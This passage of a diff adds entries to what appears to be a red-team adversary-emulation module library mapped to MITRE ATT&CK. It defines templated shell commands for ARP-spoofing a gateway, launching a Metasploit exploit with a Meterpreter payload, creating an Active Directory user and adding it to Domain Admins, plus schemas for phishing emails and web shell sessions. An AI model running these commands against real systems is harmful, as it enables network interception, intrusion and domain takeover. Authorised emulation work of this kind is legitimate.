+          "name": "ARP Spoofing Attack",
+          "icon": "",
+          "tactic": "TA0006",
+          "mitre": {
+            "tacticId": "TA0006",
+            "techniqueId": "T1557"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Network Attack",
+          "description": "Perform ARP spoofing to intercept network traffic",
+          "riskLevel": "critical",
+          "estimatedDuration": 180,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": "sudo -E ./arpspoofer.py -i ${interface} -f ${target_gateway}",
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "arp_spoof_session",
+              "label": "ARP Spoof Session",
+              "type": "Network_Attack_Session",
+              "description": "Active ARP spoofing attack"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "interface",
+              "label": "Network Interface",
+              "type": "string",
+              "required": true,
+              "placeholder": "ens33",
+              "default": "ens33",
+              "description": "Network interface to use"
+            },
+            {
+              "id": "target_gateway",
+              "label": "Target Gateway",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.1",
+              "default": null,
+              "description": "Gateway IP to spoof"
+            },
+            {
+              "id": "duration",
+              "label": "Duration (seconds)",
+              "type": "number",
+              "required": true,
+              "placeholder": "180",
+              "default": 180,
+              "description": "How long to run attack"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": ["attacker"],
+            "externalTools": ["arpspoofer.py"],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from execution plan",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["arp-spoofing", "mitm", "network-attack", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "Network_Attack_Session",
+              "collection": "Network_Attack_Session",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "arp_${run_id}_${step_id}",
+              "schema": {
+                "attackType": {
+                  "type": "string",
+                  "nullable": false,
+                  "default": "arp_spoofing"
+                },
+                "interface": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "targetGateway": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "startedAt": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "duration": {
+                  "type": "number",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_metasploit_exploit",
+          "id": "util-metasploit",
+          "name": "Metasploit Exploit",
+          "icon": "",
+          "tactic": "TA0001",
+          "mitre": {
+            "tacticId": "TA0001",
+            "techniqueId": "T1190"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Exploitation",
+          "description": "Run Metasploit exploit module",
+          "riskLevel": "critical",
+          "estimatedDuration": 120,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": "msfconsole -q -x \"use ${exploit_module}; set RHOSTS ${target_host}; set LHOST ${lhost}; set PAYLOAD ${payload}; run\"",
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "meterpreter_session",
+              "label": "Meterpreter Session",
+              "type": "Meterpreter_Session",
+              "description": "Active Meterpreter shell"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "exploit_module",
+              "label": "Exploit Module",
+              "type": "string",
+              "required": true,
+              "placeholder": "exploit/windows/http/exchange_proxyshell_rce",
+              "default": null,
+              "description": "Metasploit exploit path"
+            },
+            {
+              "id": "target_host",
+              "label": "Target Host",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.100",
+              "default": null,
+              "description": "Target IP address"
+            },
+            {
+              "id": "lhost",
+              "label": "Listener Host",
+              "type": "string",
+              "required": true,
+              "placeholder": "192.168.1.50",
+              "default": null,
+              "description": "Attacker IP for callback"
+            },
+            {
+              "id": "payload",
+              "label": "Payload",
+              "type": "string",
+              "required": true,
+              "placeholder": "windows/x64/meterpreter/bind_tcp",
+              "default": "windows/x64/meterpreter/bind_tcp",
+              "description": "Metasploit payload"
+            },
+            {
+              "id": "additional_options",
+              "label": "Additional Options",
+              "type": "text",
+              "required": false,
+              "placeholder": "set EMAIL admin@target.com",
+              "default": null,
+              "description": "Extra MSF options (one per line)"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": ["attacker"],
+            "externalTools": ["metasploit"],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from execution plan",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["metasploit", "exploitation", "initial-access", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "Meterpreter_Session",
+              "collection": "Meterpreter_Session",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "msf_${run_id}_${step_id}",
+              "schema": {
+                "sessionId": {
+                  "type": "number",
+                  "nullable": false
+                },
+                "targetHost": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "exploitModule": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "payload": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "establishedAt": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_ad_user_create",
+          "id": "util-ad-create-user",
+          "name": "Create AD User",
+          "icon": "",
+          "tactic": "TA0003",
+          "mitre": {
+            "tacticId": "TA0003",
+            "techniqueId": "T1136.002"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Active Directory",
+          "description": "Create new Active Directory user account",
+          "riskLevel": "high",
+          "estimatedDuration": 30,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": "powershell -c \"New-ADUser -Name '${full_name}' -GivenName '${first_name}' -Surname '${last_name}' -SamAccountName '${username}' -UserPrincipalName '${username}@${domain}' -AccountPassword (ConvertTo-SecureString '${password}' -AsPlainText -Force) -Enabled $true\"",
+          "inputs": [],
+          "outputs": [
+            {
+              "id": "ad_user",
+              "label": "AD User Account",
+              "type": "AD_User",
+              "description": "Created user account"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "full_name",
+              "label": "Full Name",
+              "type": "string",
+              "required": true,
+              "placeholder": "Oliver Jones",
+              "default": null,
+              "description": "Display name"
+            },
+            {
+              "id": "first_name",
+              "label": "First Name",
+              "type": "string",
+              "required": true,
+              "placeholder": "Oliver",
+              "default": null,
+              "description": "Given name"
+            },
+            {
+              "id": "last_name",
+              "label": "Last Name",
+              "type": "string",
+              "required": true,
+              "placeholder": "Jones",
+              "default": null,
+              "description": "Surname"
+            },
+            {
+              "id": "username",
+              "label": "Username",
+              "type": "string",
+              "required": true,
+              "placeholder": "oliver.jones",
+              "default": null,
+              "description": "SAM account name"
+            },
+            {
+              "id": "password",
+              "label": "Password",
+              "type": "string",
+              "required": true,
+              "placeholder": "P@ssw0rd123!",
+              "default": null,
+              "description": "Account password"
+            },
+            {
+              "id": "domain",
+              "label": "Domain",
+              "type": "string",
+              "required": true,
+              "placeholder": "contoso.com",
+              "default": null,
+              "description": "AD domain"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": ["PowerShell", "ActiveDirectory"],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from execution plan",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["active-directory", "persistence", "user-creation", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "AD_User",
+              "collection": "AD_User",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "ad_user_${run_id}_${step_id}",
+              "schema": {
+                "username": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "fullName": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "domain": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "userPrincipalName": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "createdAt": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_ad_group_add",
+          "id": "util-ad-add-group",
+          "name": "Add User to AD Group",
+          "icon": "",
+          "tactic": "TA0004",
+          "mitre": {
+            "tacticId": "TA0004",
+            "techniqueId": "T1098"
+          },
+          "category": "Robot Utility",
+          "subcategory": "Active Directory",
+          "description": "Add user to Active Directory security group",
+          "riskLevel": "critical",
+          "estimatedDuration": 15,
+          "executionType": "robot_utility",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": null,
+          "robotTemplate": null,
+          "robotLibrary": null,
+          "shellCommand": "powershell -c \"Add-ADGroupMember -Identity '${group_name}' -Members '${username}'\"",
+          "inputs": [
+            {
+              "id": "ad_user",
+              "label": "AD User",
+              "type": "AD_User",
+              "required": false,
+              "description": "User to add to group"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "group_membership",
+              "label": "Group Membership",
+              "type": "AD_Group_Membership",
+              "description": "Updated group membership"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "username",
+              "label": "Username",
+              "type": "string",
+              "required": true,
+              "placeholder": "oliver.jones",
+              "default": null,
+              "description": "SAM account name"
+            },
+            {
+              "id": "group_name",
+              "label": "Group Name",
+              "type": "string",
+              "required": true,
+              "placeholder": "Domain Admins",
+              "default": null,
+              "description": "AD group name"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": ["PowerShell", "ActiveDirectory"],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from execution plan",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["active-directory", "privilege-escalation", "group-membership", "robot-framework"]
+          },
+          "outputObjects": [
+            {
+              "type": "AD_Group_Membership",
+              "collection": "AD_Group_Membership",
+              "create": true,
+              "keyStrategy": "deterministic",
+              "keyTemplate": "ad_group_${run_id}_${step_id}",
+              "schema": {
+                "username": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "groupName": {
+                  "type": "string",
+                  "nullable": false
+                },
+                "addedAt": {
+                  "type": "datetime",
+                  "nullable": false
+                },
+                "source": {
+                  "type": "object",
+                  "nullable": false,
+                  "properties": {
+                    "moduleKey": {
+                      "type": "string"
+                    },
+                    "runId": {
+                      "type": "string"
+                    },
+                    "stepId": {
+                      "type": "string"
+                    }
+                  }
+                }
+              }
+            }
+          ]
+        },
+        {
+          "_key": "lib_util_command_pause",
+          "id": "util-command-pause",
+          "name": "Command Delay",
+          "icon": "",
+          "tactic": "control",
+          "mitre": {
+            "tacticId": null,
+            "techniqueId": null
+          },
+          "category": "Robot Utility",
+          "subcategory": "Timing",
+          "description": "Pause execution between commands (60-120s)",
+          "riskLevel": "low",
+          "estimatedDuration": 60,
+          "executionType": "orchestration",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Command Pause",
+          "robotTemplate": "Command Pause    test_flag=${test_flag}",
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "input_flow",
+              "label": "Input Flow",
+              "type": "Any",
+              "required": false,
+              "description": "Previous step"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "output_flow",
+              "label": "Output Flow",
+              "type": "Any",
+              "description": "Continue execution"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "test_flag",
+              "label": "Test Mode",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "0",
+              "options": ["0", "1"],
+              "description": "1 = 60s pause, 0 = random 60-120s"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["delay", "timing", "orchestration", "robot-framework"]
+          },
+          "outputObjects": []
+        },
+        {
+          "_key": "lib_util_stage_pause",
+          "id": "util-stage-pause",
+          "name": "Stage Delay",
+          "icon": "",
+          "tactic": "control",
+          "mitre": {
+            "tacticId": null,
+            "techniqueId": null
+          },
+          "category": "Robot Utility",
+          "subcategory": "Timing",
+          "description": "Pause between operation stages (45-60min)",
+          "riskLevel": "low",
+          "estimatedDuration": 2700,
+          "executionType": "orchestration",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Stage Pause",
+          "robotTemplate": "Stage Pause    test_flag=${test_flag}",
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "input_flow",
+              "label": "Input Flow",
+              "type": "Any",
+              "required": false,
+              "description": "Previous stage"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "output_flow",
+              "label": "Output Flow",
+              "type": "Any",
+              "description": "Continue to next stage"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "test_flag",
+              "label": "Test Mode",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "0",
+              "options": ["0", "1"],
+              "description": "1 = 120s pause, 0 = random 45-60min"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["delay", "timing", "orchestration", "robot-framework"]
+          },
+          "outputObjects": []
+        },
+        {
+          "_key": "lib_util_shift_pause",
+          "id": "util-shift-pause",
+          "name": "Shift Delay",
+          "icon": "",
+          "tactic": "control",
+          "mitre": {
+            "tacticId": null,
+            "techniqueId": null
+          },
+          "category": "Robot Utility",
+          "subcategory": "Timing",
+          "description": "Long pause between work shifts (8-12 hours)",
+          "riskLevel": "low",
+          "estimatedDuration": 28800,
+          "executionType": "orchestration",
+          "cobaltStrikeCommand": null,
+          "robotKeyword": "Shift Pause",
+          "robotTemplate": "Shift Pause    test_flag=${test_flag}",
+          "robotLibrary": null,
+          "shellCommand": null,
+          "inputs": [
+            {
+              "id": "input_flow",
+              "label": "Input Flow",
+              "type": "Any",
+              "required": false,
+              "description": "Previous shift"
+            }
+          ],
+          "outputs": [
+            {
+              "id": "output_flow",
+              "label": "Output Flow",
+              "type": "Any",
+              "description": "Continue to next shift"
+            }
+          ],
+          "parameters": [
+            {
+              "id": "test_flag",
+              "label": "Test Mode",
+              "type": "select",
+              "required": true,
+              "placeholder": null,
+              "default": "0",
+              "options": ["0", "1"],
+              "description": "1 = 120s pause, 0 = random 8-12 hours"
+            }
+          ],
+          "requirements": {
+            "c2Server": false,
+            "listeners": [],
+            "payloads": [],
+            "sshConnections": [],
+            "externalTools": [],
+            "libraries": []
+          },
+          "metadata": {
+            "version": "1.0.0",
+            "lastUpdated": "2026-01-09T00:00:00Z",
+            "updatedBy": "automation-team",
+            "validationStatus": "production",
+            "changeLog": "Initial creation from Robot Framework utilities",
+            "owner": "OPFOR Team",
+            "status": "production",
+            "tags": ["delay", "timing", "orchestration", "robot-framework"]
+          },
+          "outputObjects": []
+        }
+      ]
+    },
+    {
+      "name": "ObjectType",
+      "documents": [
+        {
+          "_key": "Phishing_Email",
+          "name": "Phishing_Email",
+          "description": "Configured phishing email ready to send",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "sender": {
+                "type": "string"
+              },
+              "recipients": {
+                "type": "array"
+              },
+              "subject": {
+                "type": "string"
+              },
+              "bodyPath": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        {
+          "_key": "Email_Campaign_Result",
+          "name": "Email_Campaign_Result",
+          "description": "Results from sending phishing campaign",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "sentCount": {
+                "type": "number"
+              },
+              "failedCount": {
+                "type": "number"
+              },
+              "timestamp": {
+                "type": "datetime"
+              }
+            }
+          }
+        },
+        {
+          "_key": "HTTP_Server",
+          "name": "HTTP_Server",
+          "description": "Running HTTP server for payload staging",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "port": {
+                "type": "number"
+              },
+              "hostDirectory": {
+                "type": "string"
+              },
+              "status": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        {
+          "_key": "WebShell_Session",
+          "name": "WebShell_Session",
+          "description": "Active web shell connection",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "webshellUrl": {
+                "type": "string"
+              },
+              "postParameter": {
+                "type": "string"
+              },
+              "targetHost": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        {
+          "_key": "Network_Scan_Results",
+          "name": "Network_Scan_Results",
+          "description": "Results from network scanning",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "targetNetwork": {
+                "type": "string"
+              },
+              "hostsDiscovered": {
+                "type": "number"
+              },
+              "scanOutput": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        {
+          "_key": "SSH_Connection",
+          "name": "SSH_Connection",
+          "description": "Active SSH terminal session",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "host": {
+                "type": "string"
+              },
+              "username": {
+                "type": "string"
+              },
+              "alias": {
+                "type": "string"
+              },
+              "status": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        {
+          "_key": "Network_Attack_Session",
+          "name": "Network_Attack_Session",
+          "description": "Active network attack session (ARP spoofing, etc)",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "attackType": {
+                "type": "string"
+              },
+              "interface": {
+                "type": "string"
+              },
+              "targetGateway": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        {
+          "_key": "Meterpreter_Session",
+          "name": "Meterpreter_Session",
+          "description": "Active Metasploit Meterpreter session",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "sessionId": {
+                "type": "number"
+              },
+              "targetHost": {
+                "type": "string"
+              },
+              "exploitModule": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        {
+          "_key": "AD_User",
+          "name": "AD_User",
+          "description": "Active Directory user account",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "username": {
+                "type": "string"
+              },
+              "fullName": {
+                "type": "string"
+              },
+              "domain": {
+                "type": "string"
+              }
+            }
+          }
+        },
+        {
+          "_key": "AD_Group_Membership",
+          "name": "AD_Group_Membership",
+          "description": "Active Directory group membership record",
+          "shape": {
+            "type": "object",
+            "properties": {
+              "username": {
+                "type": "string"
+              },
+              "groupName": {
+                "type": "string"
+              },
+              "addedAt": {
+                "type": "datetime"
+              }
+            }
+          }
+        }
+      ]
+    }
+  ]
+}
